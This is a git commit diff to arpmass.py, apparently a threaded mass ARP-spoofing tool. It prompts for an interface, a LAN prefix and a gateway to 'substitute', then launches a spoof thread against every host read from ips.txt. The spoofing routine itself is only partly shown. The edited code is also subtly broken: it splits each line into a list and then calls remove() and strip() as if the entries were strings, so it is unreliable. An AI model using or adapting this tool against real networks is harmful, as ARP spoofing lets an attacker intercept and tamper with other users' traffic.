ee3d648364bfffaf86ea361744ff03d4a3a3e8d0
i1409 <israel.14@outlook.com>
2021-05-04 12:17:39 -0500

    remove gw

--- arpmass.py
+++ arpmass.py
@@ -29,13 +29,17 @@ def set_neigh(iface,lan):
 def get_neigh(iface,gw):
     f_ips=open('ips.txt','r')
     threads=[]
+    ip_table= []
+
     for ip in f_ips:
-        if ip != gw:
-            print(Fore.WHITE+'----------------------')
-            print(ip.strip() + Fore.GREEN+" Found")
-            new_thread=threading.Thread(target=spoof, args=(iface,ip,gw))
-            threads.append(new_thread)
-            new_thread.start()
+            ip_table.append(ip.split())
+    ip_table.remove(gw)
+    for ip in ip_table:
+        print(Fore.WHITE+'----------------------')
+        print(ip.strip() + Fore.GREEN+" Found")
+        new_thread=threading.Thread(target=spoof, args=(iface,ip,gw))
+        threads.append(new_thread)
+        new_thread.start()
 
 def spoof(iface,ip,gw):
     try:
@@ -48,9 +52,7 @@ def spoof(iface,ip,gw):
 if __name__=='__main__':
     print(banner)
     iface = input("Enter the interface name to use-> ".strip())
-    lan = input("Enter de LAN to spoof (x.x.x)-> ".strip())
-    
-    # gw_cmd="""ip route sh | grep default | grep {} | cut -d " " -f 3""".format(iface)
+    lan = input("Enter de LAN to spoof (x.x.x)-> ".strip())    
     gw = input("Enter the gateway to subsitute-> ".strip())
     print('READING ARP TABLE\n++++++++++++++++++++++')
     set_neigh(iface,lan)
